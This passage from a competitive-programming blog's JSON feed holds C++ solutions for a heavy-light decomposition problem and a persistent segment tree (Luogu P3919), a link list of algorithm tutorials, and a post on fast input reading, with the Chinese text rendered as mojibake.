class=\"number\">1</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">read</span>(x);<span class=\"built_in\">read</span>(y);<span class=\"built_in\">read</span>(z);</span><br><span class=\"line\">            <span class=\"built_in\">updRange</span>(x,y,z);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(k==<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">read</span>(x);<span class=\"built_in\">read</span>(y);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">qRange</span>(x,y));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(k==<span class=\"number\">3</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">read</span>(x);<span class=\"built_in\">read</span>(y);</span><br><span class=\"line\">            <span class=\"built_in\">updSon</span>(x,y);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">read</span>(x);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,<span class=\"built_in\">qSon</span>(x));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "æ•°é“¾å‰–åˆ†"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/",
            "url": "http://cubicy.icu/2018/02/21/%E4%BF%A1%E6%81%AF%E5%AD%A6%E7%AB%9E%E8%B5%9B%E7%9B%B8%E5%85%B3%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E5%90%88%E9%9B%86/",
            "title": "ä¿¡æ¯å­¦ç«èµ›ç›¸å…³ä¼˜ç§€æ–‡ç« åˆé›†",
            "date_published": "2018-02-21T15:36:00.000Z",
            "content_html": "<p><a href=\"//blog.csdn.net/zearot/article/details/48299459\">çº¿æ®µæ ‘è¯¦è§£ ï¼ˆåŸç†ï¼Œå®ç°ä¸åº”ç”¨ï¼‰</a><br><a href=\"//blog.csdn.net/lyd_7_29/article/details/51405469\">å¯æŒä¹…åŒ–çº¿æ®µæ ‘ ç®€ä»‹</a>  </p>\n<p><a href=\"//files.cnblogs.com/files/yyy2015c01/%E8%BF%90%E7%94%A8%E4%BC%B8%E5%B1%95%E6%A0%91%E8%A7%A3%E5%86%B3%E6%95%B0%E5%88%97%E7%BB%B4%E6%8A%A4%E9%97%AE%E9%A2%98.pdf\">è¿ç”¨ä¼¸å±•æ ‘è§£å†³æ•°åˆ—ç»´æŠ¤é—®é¢˜.pdf</a><br><a href=\"//oi.men.ci/splay-notes-1/\">Splay å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</a><br><a href=\"//oi.men.ci/splay-notes-2/\">Splay å­¦ä¹ ç¬”è®°ï¼ˆäºŒï¼‰</a><br><a href=\"//oi.men.ci/splay-notes-3/\">Splay å­¦ä¹ ç¬”è®°ï¼ˆä¸‰ï¼‰</a>   </p>\n<p><a href=\"//lib.csdn.net/article/datastructure/9204\">è¯·è¦ç›¸ä¿¡æˆ‘ï¼Œ30åˆ†é’Ÿè®©ä½ æŒæ¡AVLæ ‘ï¼ˆå¹³è¡¡äºŒå‰æ ‘ï¼‰</a><br><a href=\"//blog.csdn.net/sun_tttt/article/details/65445754\">æœ€å®¹æ˜“æ‡‚çš„çº¢é»‘æ ‘</a><br><a href=\"//www.cnblogs.com/Mathics/p/3971220.html\">ä¸‰å¤§å¹³è¡¡æ ‘ï¼ˆTreap + Splay + SBTï¼‰æ€»ç»“+æ¨¡æ¿</a><br><a href=\"//oi.men.ci/link-cut-tree-notes/\">Link-Cut Tree å­¦ä¹ ç¬”è®°</a><br><a href=\"//files.cnblogs.com/files/yyy2015c01/%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%A0%94%E7%A9%B6.pdf\">å¯æŒä¹…åŒ–æ•°æ®ç»“æ„ç ”ç©¶.pdf</a>  </p>\n<p><a href=\"//www.cnblogs.com/dalt/p/8206664.html\">æ ‘é“¾å‰–åˆ†è¯¦è§£</a><br><a href=\"//www.cnblogs.com/chinhhh/p/7965433.html\">æ ‘é“¾å‰–åˆ†è¯¦è§£ï¼ˆæ´›è°·æ¨¡æ¿ P3384ï¼‰</a>  </p>\n<p><a href=\"//blog.csdn.net/PomeCat/article/details/72832494\">åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰ä¼˜åŒ–ä¹‹æ–œç‡ä¼˜åŒ–è®²è§£</a><br><a href=\"//www.cnblogs.com/MashiroSky/p/6009685.html\">æ–œç‡ä¼˜åŒ–å­¦ä¹ ç¬”è®°</a><br><a href=\"//www.cnblogs.com/mlystdcall/p/6525962.html\">å››è¾¹å½¢ä¸ç­‰å¼å­¦ä¹ ç¬”è®°</a><br><a href=\"//www.yhzq-blog.cc/%E6%8F%92%E5%A4%B4dp-%E4%BB%8E%E4%B8%8D%E4%BC%9A%E5%88%B0%E5%B4%A9%E6%BA%83/\">æ’å¤´dpå…¥é—¨</a>  </p>\n<p><a href=\"//segmentfault.com/a/1190000003914228\">æœ€é•¿å›æ–‡å­ä¸²â€”â€”Manacher ç®—æ³•ï¼ˆäººç§°â€œé©¬æ‹‰è½¦ç®—æ³•â€ï¼‰</a>  </p>\n<p><a href=\"//www.cnblogs.com/mlystdcall/p/6734852.html\">ä¸Šä¸‹ç•Œç½‘ç»œæµå»ºæ¨¡æ–¹æ³•æ€»ç»“</a>   </p>\n<p><a href=\"//www.gatevin.moe/acm/fft%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">FFTç®—æ³•å­¦ä¹ ç¬”è®°</a><br><a href=\"//www.cnblogs.com/tmzbot/p/4668158.html\">Fast Walsh-Hadamard Transformï¼ˆå¿«é€Ÿæ²ƒå°”ä»€å˜æ¢ï¼‰</a>  </p>\n<p><a href=\"//www.cnblogs.com/mlystdcall/p/6219421.html\">ç®€æ˜“CDQåˆ†æ²»æ•™ç¨‹&amp;å­¦ä¹ ç¬”è®°</a><br><a href=\"//www.cnblogs.com/mlystdcall/p/6232324.html\">å››ç»´ååº(CDQå¥—CDQ)</a></p>\n",
            "tags": []
        },
        {
            "id": "http://cubicy.icu/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/",
            "url": "http://cubicy.icu/2018/02/20/%E6%B4%9B%E8%B0%B7P3919%20%E3%80%90%E6%A8%A1%E6%9D%BF%E3%80%91%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E6%95%B0%E7%BB%84/",
            "title": "æ´›è°·:P3919 ã€æ¨¡æ¿ã€‘å¯æŒä¹…åŒ–æ•°ç»„ï¼ˆå¯æŒä¹…åŒ–çº¿æ®µæ ‘/å¹³è¡¡æ ‘ï¼‰",
            "date_published": "2018-02-20T15:36:00.000Z",
            "content_html": "<p>åŸé¢˜åœ°å€:<a href=\"//www.luogu.org/problemnew/show/P3919\">https://www.luogu.org/problemnew/show/P3919</a></p>\n<h3 id=\"é¢˜ç›®ç®€è¿°\"><a href=\"#é¢˜ç›®ç®€è¿°\" class=\"headerlink\" title=\"é¢˜ç›®ç®€è¿°\"></a>é¢˜ç›®ç®€è¿°</h3><p>ç»´æŠ¤ä¸€ä¸ªé•¿åº¦ä¸ºNçš„æ•°ç»„ï¼Œæ”¯æŒå¦‚ä¸‹å‡ ç§æ“ä½œï¼š  </p>\n<ol>\n<li>åœ¨æŸä¸ªå†å²ç‰ˆæœ¬ä¸Šä¿®æ”¹æŸä¸€ä¸ªä½ç½®ä¸Šçš„å€¼  </li>\n<li>è®¿é—®æŸä¸ªå†å²ç‰ˆæœ¬ä¸Šçš„æŸä¸€ä½ç½®çš„å€¼<br>æ­¤å¤–ï¼Œæ¯è¿›è¡Œä¸€æ¬¡æ“ä½œï¼ˆå¯¹äºæ“ä½œ2ï¼Œå³ä¸ºç”Ÿæˆä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„ç‰ˆæœ¬ï¼Œä¸ä½œä»»ä½•æ”¹åŠ¨ï¼‰ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ã€‚ç‰ˆæœ¬ç¼–å·å³ä¸ºå½“å‰æ“ä½œçš„ç¼–å·ï¼ˆä»1å¼€å§‹ç¼–å·ï¼Œç‰ˆæœ¬0è¡¨ç¤ºåˆå§‹çŠ¶æ€æ•°ç»„ï¼‰</li>\n</ol>\n<hr>\n<h3 id=\"æ€è·¯\"><a href=\"#æ€è·¯\" class=\"headerlink\" title=\"æ€è·¯\"></a>æ€è·¯</h3><p>é¦–å…ˆæ„Ÿè°¢æ¥è‡ª<a href=\"https://www.luogu.org/space/show?uid=2978\">@zcysky</a>çš„æ¨¡æ¿ã€‚å†™çš„éå¸¸æ¼‚äº®ï¼Œå°è£…ä¹Ÿå¾ˆç²¾è‡´ã€‚<br>è¿™é¢˜æ˜¯è£¸é¢˜ï¼Œäºæ˜¯ç›´æ¥ä¸Šæ¨¡æ¿å°±è¡Œäº†ã€‚æ³¨æ„æ­¤é¢˜è¾“å…¥æ•°æ®å¤§ï¼Œéœ€è¦è¯»å…¥ä¼˜åŒ–ã€‚<br>å…³äºå¯æŒä¹…åŒ–çº¿æ®µæ ‘çš„ä»‹ç»ä¸æ€»ç»“ï¼Œä¹‹åæŠŠå‘å¡«ä¸Šã€‚  </p>\n<hr>\n<h3 id=\"ä»£ç \"><a href=\"#ä»£ç \" class=\"headerlink\" title=\"ä»£ç \"></a>ä»£ç </h3><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span><span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">int</span> N=<span class=\"number\">1000005</span>;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"type\">int</span> a[N],n,q,rt[N*<span class=\"number\">20</span>];<span class=\"comment\">//ç©ºé—´å¤æ‚åº¦O(mlogn) </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXB 50000000</span></span><br><span class=\"line\"><span class=\"type\">char</span> buf[MAXB],*cp=buf;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">read</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> f=<span class=\"number\">1</span>,x=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*cp&lt;<span class=\"string\">&#x27;0&#x27;</span>||*cp&gt;<span class=\"string\">&#x27;9&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*cp==<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">            f=<span class=\"number\">-1</span>;</span><br><span class=\"line\">        cp++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*cp&gt;=<span class=\"string\">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class=\"string\">&#x27;9&#x27;</span>) &#123;</span><br><span class=\"line\">        x=x*<span class=\"number\">10</span>+*cp-<span class=\"string\">&#x27;0&#x27;</span>; </span><br><span class=\"line\">        cp++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f*x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Persistable_Segment_Tree</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> lc[N*<span class=\"number\">20</span>],rc[N*<span class=\"number\">20</span>],val[N*<span class=\"number\">20</span>],cnt;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">build</span><span class=\"params\">(<span class=\"type\">int</span> &amp;o,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r)</span></span>&#123;</span><br><span class=\"line\">        o=++cnt;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(l==r) &#123;</span><br><span class=\"line\">            val[o]=a[l];</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">int</span> mid=(l+r)&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">build</span>(lc[o],l,mid);</span><br><span class=\"line\">        <span class=\"built_in\">build</span>(rc[o],mid+<span class=\"number\">1</span>,r);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title\">ins</span><span class=\"params\">(<span class=\"type\">int</span> &amp;o,<span class=\"type\">int</span> pre,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r,<span class=\"type\">int</span> q,<span class=\"type\">int</span> v)</span></span>&#123;</span><br><span class=\"line\">        o=++cnt;</span><br><span class=\"line\">        lc[o]=lc[pre];</span><br><span class=\"line\">        rc[o]=rc[pre];</span><br><span class=\"line\">        val[o]=val[pre];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(l==r) &#123;</span><br><span class=\"line\">            val[o]=v;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">int</span> mid=(l+r)&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q&lt;=mid)</span><br><span class=\"line\">            <span class=\"built_in\">ins</span>(lc[o],lc[pre],l,mid,q,v);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">            <span class=\"built_in\">ins</span>(rc[o],rc[pre],mid+<span class=\"number\">1</span>,r,q,v);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">query</span><span class=\"params\">(<span class=\"type\">int</span> o,<span class=\"type\">int</span> l,<span class=\"type\">int</span> r,<span class=\"type\">int</span> q)</span></span>&#123;<span class=\"comment\">//ç±»ä¼¼äºŒåˆ†çš„æŸ¥è¯¢ </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(l==r)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> val[o];</span><br><span class=\"line\">        <span class=\"type\">int</span> mid=(l+r)&gt;&gt;<span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(q&lt;=mid)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">query</span>(lc[o],l,mid,q);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">query</span>(rc[o],mid+<span class=\"number\">1</span>,r,q);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;T;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">fread</span>(buf,<span class=\"number\">1</span>,MAXB,stdin);</span><br><span class=\"line\">    n=<span class=\"built_in\">read</span>();</span><br><span class=\"line\">    <span class=\"type\">int</span> m=<span class=\"built_in\">read</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=n;i++)</span><br><span class=\"line\">        a[i]=<span class=\"built_in\">read</span>();</span><br><span class=\"line\">    T.<span class=\"built_in\">build</span>(rt[<span class=\"number\">0</span>],<span class=\"number\">1</span>,n);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">1</span>;i&lt;=m;i++)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> pre=<span class=\"built_in\">read</span>(),opt=<span class=\"built_in\">read</span>(),x=<span class=\"built_in\">read</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(opt==<span class=\"number\">1</span>) &#123;<span class=\"comment\">//æ“ä½œ1:åœ¨ç‰ˆæœ¬preçš„åŸºç¡€ä¸Šå°†ç¬¬xä¸ªæ•°ä¿®æ”¹ä¸ºv </span></span><br><span class=\"line\">            <span class=\"type\">int</span> v=<span class=\"built_in\">read</span>();</span><br><span class=\"line\">            T.<span class=\"built_in\">ins</span>(rt[i],rt[pre],<span class=\"number\">1</span>,n,x,v);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(opt==<span class=\"number\">2</span>) &#123;<span class=\"comment\">//æ“ä½œ2:è®¿é—®ç‰ˆæœ¬preä¸­ç¬¬xä¸ªæ•°çš„å€¼ </span></span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,T.<span class=\"built_in\">query</span>(rt[pre],<span class=\"number\">1</span>,n,x));</span><br><span class=\"line\">            rt[i]=rt[pre];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>",
            "tags": [
                "æŒä¹…åŒ–",
                "çº¿æ®µæ ‘"
            ]
        },
        {
            "id": "http://cubicy.icu/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/",
            "url": "http://cubicy.icu/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/",
            "title": "OIä¸­çš„IOä¼˜åŒ–",
            "date_published": "2018-02-20T13:09:00.000Z",
            "content_html": "<p>æœ¬æ–‡ä¸»è¦è®²è¿°å¸¸ç”¨çš„2ç§è¯»å…¥ä¼˜åŒ–æ–¹æ³•ã€‚<br>è¾“å‡ºä¼˜åŒ–å¾ˆå°‘ä½¿ç”¨ï¼Œåœ¨æ­¤ç®€å•æä¸€ä¸‹ï¼šä¹Ÿå°±æ˜¯æŠŠè¾“å‡ºçš„ä¸œè¥¿å…ˆæ”¾è¿›å­—ç¬¦ä¸²ï¼Œå†ä¸€æ¬¡æ€§puts\\printfå‡ºå»ã€‚æå‡ä¸å¤§ï¼Œä¸å¸¸ç”¨ã€‚<br>é¦–å…ˆå½“ç„¶éœ€è¦å…ˆçŸ¥é“ï¼Œscanf&#x2F;printfæ¯”cin&#x2F;coutå¿«ä¸å°‘ã€‚<br>è¯»å…¥ä¼˜åŒ–ï¼š </p>\n<ol>\n<li>getchar<br>ä½¿ç”¨getcharä¸€ä¸ªä¸€ä¸ªè¯»å…¥å­—ç¬¦ï¼Œè½¬åŒ–æˆæ•°å­—ã€‚æ¯”scanfå¿«ä¸€äº›ã€‚<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">read</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> f=<span class=\"number\">1</span>,x=<span class=\"number\">0</span>;<span class=\"comment\">//fæ˜¯æ­£è´Ÿçš„æ ‡è¯†</span></span><br><span class=\"line\">    <span class=\"type\">char</span> ch;</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(ch==<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">            f=<span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span>(ch&lt;<span class=\"string\">&#x27;0&#x27;</span>||ch&gt;<span class=\"string\">&#x27;9&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        x=x*<span class=\"number\">10</span>+ch-<span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">        ch=<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span>(ch&gt;=<span class=\"string\">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class=\"string\">&#x27;9&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f*x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n2.fread  ï¼ˆéå¸¸å¿«ï¼ï¼‰<br>freadå°†stdiné‡Œçš„å†…å®¹è¯»åˆ°å­—ç¬¦ä¸²é‡Œï¼Œç„¶ååˆ©ç”¨æŒ‡é’ˆå¤„ç†ã€‚<br>é¦–å…ˆå®šä¹‰æŒ‡é’ˆå’Œè¯»å…¥çš„æ•°ç»„ï¼š  <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXB 10000000</span></span><br><span class=\"line\"><span class=\"comment\">//å®šä¹‰è¯»å…¥æœ€é•¿çš„é•¿åº¦</span></span><br><span class=\"line\">    <span class=\"type\">char</span> buf[MAXB],*cp=buf;</span><br></pre></td></tr></table></figure>\næ¥ä¸‹æ¥æ˜¯è¯»å…¥ï¼š  <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">fread</span>(buf,<span class=\"number\">1</span>,MAXB,stdin);<span class=\"comment\">//å‡½æ•°å…·ä½“å‚æ•°å«ä¹‰è¯·å–„ç”¨æœç´¢å¼•æ“</span></span><br></pre></td></tr></table></figure>\næœ€åæ˜¯ä»ä¸­å¤„ç†å‡ºæ•°æ®ï¼ˆç°åœ¨è¿™ä¸ªå‡½æ•°æ˜¯ä¸ºäº†å¤„ç†intæ•´å‹è€Œè®¾è®¡ï¼‰  <figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">int</span> <span class=\"title\">read</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> f=<span class=\"number\">1</span>,x=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*cp&lt;<span class=\"string\">&#x27;0&#x27;</span>||*cp&gt;<span class=\"string\">&#x27;9&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(*cp==<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">            f=<span class=\"number\">-1</span>;</span><br><span class=\"line\">        cp++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(*cp&gt;=<span class=\"string\">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class=\"string\">&#x27;9&#x27;</span>) &#123;</span><br><span class=\"line\">        x=x*<span class=\"number\">10</span>+*cp-<span class=\"string\">&#x27;0&#x27;</span>; </span><br><span class=\"line\">        cp++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> f*x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n",
            "tags": []
        }
    ]
}